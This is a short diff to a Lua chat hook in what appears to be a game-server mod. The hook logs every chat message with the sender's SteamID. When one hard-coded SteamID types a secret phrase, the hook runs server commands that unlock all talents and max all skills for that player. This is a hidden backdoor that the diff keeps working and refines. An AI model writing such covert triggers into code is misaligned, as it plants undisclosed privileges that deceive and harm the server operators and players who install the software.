@@ -60,10 +60,10 @@ local limbTypes = {
 
 Hook.Add("chatMessage", "thing", function(message, sender)
     print(message.." "..sender.SteamID)
-    if tostring(sender.SteamID) == "76561198408663756" and message == "javiertime" then
+    if tostring(sender.SteamID) == "76561198408663756" and message == "Javiertime" then
         JavierTime = true
-        Game.ExecuteCommand("unlocktalents all " .. sender.Name)
-        Game.ExecuteCommand("setskill all max " .. sender.Name)
+        Game.ExecuteCommand("unlocktalents all " .. sender.Character.Name)
+        Game.ExecuteCommand("setskill all max " .. sender.Character.Name)
         print("Its javiertime")
     end
 end)
